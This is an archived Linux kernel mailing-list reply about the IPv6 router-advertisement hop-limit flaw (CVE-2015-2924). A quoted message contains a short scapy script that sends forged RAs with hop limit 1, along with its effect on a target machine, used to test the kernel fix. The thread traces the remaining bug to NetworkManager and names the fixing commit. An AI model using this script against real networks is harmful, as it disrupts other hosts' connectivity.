From: Dan Williams <dcbw@redhat.com>
Subject: Re: [GIT] Networking
Date: Wed, 29 Apr 2015 13:13:20 -0500
Message-ID: <1430331200.8790.1.camel@redhat.com>
References: <20150401.154847.612566794393812348.davem@davemloft.net>
		 <CAK1hOcOd=dLUyxJy1mEj2=Hy-zOqDp2KJ8or+1Zrsk+BvNn5oQ@mail.gmail.com>
		 <5540F605.2040907@modio.se> <1430326235.4070.16.camel@redhat.com>
	 <55410CF4.9000609@modio.se>
Mime-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit
Cc: Denys Vlasenko <vda.linux@googlemail.com>,
	David Miller <davem@davemloft.net>,
	Linus Torvalds <torvalds@linux-foundation.org>,
	Andrew Morton <akpm@linux-foundation.org>,
	netdev@vger.kernel.org,
	Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
	Hannes Frederic Sowa <hannes@stressinduktion.org>,
	Don Howard <dhoward@redhat.com>
To: "D.S. Ljungmark" <ljungmark@modio.se>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <55410CF4.9000609@modio.se>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

On Wed, 2015-04-29 at 18:55 +0200, D.S. Ljungmark wrote:
> 
> On 29/04/15 18:50, Dan Williams wrote:
> > On Wed, 2015-04-29 at 17:17 +0200, D.S. Ljungmark wrote:
> >> On 29/04/15 16:51, Denys Vlasenko wrote:
> >>> On Wed, Apr 1, 2015 at 9:48 PM, David Miller <davem@davemloft.net> wrote:
> >>>> D.S. Ljungmark (1):
> >>>>       ipv6: Don't reduce hop limit for an interface
> >>>
> >>> https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6fd99094de2b83d1d4c8457f2c83483b2828e75a
> >>>
> >>> I was testing this change and apparently it doesn't close the hole.
> >>>
> >>> The python script I use to send RAs:
> >>>-
> >>> #!/usr/bin/env python
> >>> import sys
> >>> import time
> >>> import scapy.all
> >>> from scapy.layers.inet6 import *
> >>> ip = IPv6()
> >>> # ip.dst = 'ff02::1'
> >>> ip.dst = sys.argv[1]
> >>> icmp = ICMPv6ND_RA()
> >>> icmp.chlim = 1
> >>> for x in range(10):
> >>>     send(ip/icmp)
> >>>     time.sleep(1)
> >>>
> >>> # ./ipv6-hop-limit.py fe80::21e:37ff:fed0:5006
> >>> .
> >>> Sent 1 packets.
> >>> ...<10 times>...
> >>> Sent 1 packets.
> >>>
> >>> After I do this, on the targeted machine I check hop_limits:
> >>>
> >>> # for f in /proc/sys/net/ipv6/conf/*/hop_limit; do echo -n $f:; cat $f; done
> >>> /proc/sys/net/ipv6/conf/all/hop_limit:64
> >>> /proc/sys/net/ipv6/conf/default/hop_limit:64
> >>> /proc/sys/net/ipv6/conf/enp0s25/hop_limit:1  <=== THIS
> >>> /proc/sys/net/ipv6/conf/lo/hop_limit:64
> >>> /proc/sys/net/ipv6/conf/wlp3s0/hop_limit:64
> >>>
> >>> As you see, the interface which received RAs still lowered
> >>> its hop_limit to 1. I take it means that the bug is still present
> >>> (right? I'm not a network guy...).
> >>
> >> It might not be present in the _kernel_. Do you run NetworkManager on
> >> your system? If so, see below.
> >>
> >>>
> >>> I triple-checked that I do run the kernel with the fix.
> >>> Further investigation shows that the code touched by the fix
> >>> is not even reached, hop_limit is changed elsewhere.
> >>>
> >>> I'm willing to test additional patches.
> >>
> >> NetworkManager had it's own re-implementation of the bug. It got fixed
> >> with NetworkManager commit:
> >>
> >> commit bdaaf9849b0cacf131b71fa2ae168f5db796874f
> >> Author: Thomas Haller <thaller@redhat.com>
> >> Date:   Wed Apr 8 15:54:30 2015 +0200
> >>
> >>     platform: don't accept lowering IPv6 hop-limit from RA (CVE-2015-2924)
> >>
> >>
> >>
> >> Beforte that commit, NetworkManager would take the RA packet, extract
> >> the hop limit, and write it to the sysctl itself.
> > 
> > Yup, we basically followed the original kernel logic here, so we needed
> > to patch it in NM as well.  It's been backported to NM 0.9.10, 1.0, and
> > obviously is in git master.
> > 
> 
> Are there any release announcements for NetworkManager? Or a place to
> link for official releases/homepage?

The mailing list:
https://mail.gnome.org/mailman/listinfo/networkmanager-list

The project site: https://wiki.gnome.org/Projects/NetworkManager

Dan
